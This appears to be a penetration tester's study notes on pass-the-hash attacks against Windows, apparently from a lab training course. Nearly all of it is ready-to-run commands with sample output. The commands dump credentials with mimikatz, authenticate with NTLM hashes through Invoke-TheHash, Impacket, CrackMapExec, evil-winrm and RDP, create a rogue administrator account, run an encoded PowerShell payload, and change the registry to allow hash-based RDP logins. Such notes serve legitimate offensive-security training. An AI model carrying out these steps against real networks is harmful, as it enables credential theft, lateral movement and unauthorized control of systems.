#windows/auth/pass-the-hash
#linux/auth/pass-the-hash
# Windows NTLM
Legacy SSO mechanism. We can use NTLM hash for PtH.

https://github.com/gentilkiwi/mimikatz

# PtH with mimikatz
```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
* /user - The user name we want to impersonate.
* /rc4 or /NTLM - NTLM hash of the user's password.
* /domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
* /run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

#### Extract hashes from an admin account of other users
```powershell
.\mimikatz.exe

privilege::debug
sekurlsa::logonpasswords
```
	
# PtH with Invoke-TheHash
https://github.com/Kevin-Robertson/Invoke-TheHash

## SMB
```powershell
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```
## WMI
```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <base64 payload>"

[+] Command executed with process id 520 on DC01
```

# PtH with Impacket
```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
Another Impacket tools:
* impacket-wmiexec
* impacket-atexec
* impacket-smbexec

# PtH with #CrackMapExec
cme is a tool for password spraying on AD.

```bash
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```

If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add --local-auth to our command

 If we see Pwn3d!, it means that the user is a local administrator on the target computer. We can use the option -x to execute commands.
### Command execution
```bash
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.201.126  445    MS01            [+] Executed command 
SMB         10.129.201.126  445    MS01            MS01\administrator
```

# PtH with evil-winrm
```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
Note: When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb

# PtH with [[RDP]]
Enable Restricted Admin Mode to Allow PtH:
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
Connect:
```bash
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

# UAC Limits Pass the Hash for Local Accounts
When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.

Note: There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.
